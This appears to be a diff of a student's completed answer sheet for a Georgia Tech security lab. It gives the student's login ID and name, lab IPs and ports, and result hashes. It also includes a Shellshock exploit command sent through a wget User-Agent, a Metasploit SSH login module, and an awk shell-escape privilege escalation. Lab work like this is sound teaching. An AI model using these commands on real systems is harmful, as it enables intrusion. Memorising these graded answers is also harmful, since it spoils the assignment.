@@ -20,8 +20,8 @@ Example:
   Your Name: George Burdell
 
 -->
-  Your GT Login ID:
-  Your Name:
+  Your GT Login ID: mhuang366
+  Your Name: Minying Huang
 <--
 
 Task 1
@@ -32,7 +32,7 @@ Task 1
 Example:
   IP : 172.17.0.1
 -->
-  IP :
+  IP : 172.22.0.10, 172.22.0.1
 <--
 
 
@@ -42,7 +42,7 @@ Example:
   Port : 9999
 
 -->
-  Port :
+  Port : 8088
 <--
 
 3. On which port is the Python web server running?
@@ -51,7 +51,7 @@ Example:
   Port : 9998
 
 -->
-  Port :
+  Port : 8000
 <--
 
 
@@ -64,14 +64,14 @@ Example:
   Command : curl http://10.0.2.1:6262/cgi-bin/shellshock.cgi
 
 -->
-  Command :
+  Command : wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/task2 mhuang366" http://172.22.0.10:8088/cgi-bin/shellshock.cgi
 <--
 
 
 2. What hash value is returned by running ./bin/task2 with your student ID.
 
 -->
-  Hash :
+  Hash : f7b6e16c47108233a082db3413960b7b13e35670d658655f6d5bd1c98439e136
 <--
 
 
@@ -84,7 +84,7 @@ Example:
   Module : auxiliary/scanner/portscan/tcp
 
 -->
-  Module :
+  Module : auxiliary/scanner/ssh/ssh_login
 <--
 
 
@@ -94,14 +94,14 @@ Example:
   PortNumber : 4242
 
 -->
-  PortNumber :
+  PortNumber : 9280
 <--
 
 
 3. What hash value is returned by running ./usr/bin/task3 with your student ID.
 
 -->
-  Hash :
+  Hash : 52d59b16643d595430f99d4bb50b39c4e06f010df7a284c24d3be2be44badb29
 <--
 
 
@@ -115,14 +115,14 @@ Example:
   Command : system "/bin/sh"
 
 -->
-  Command :
+  Command : /usr/bin/mawk 'BEGIN {system("/bin/sh")}'
 <--
 
 
 2. What hash value is returned by running ./bin/task4 with your student ID.
 
 -->
-  Hash :
+  Hash : c25353838da4821c7ac67ac28aeb38751d6091647adcde08e233382ddd8168e3
 <--
 
 
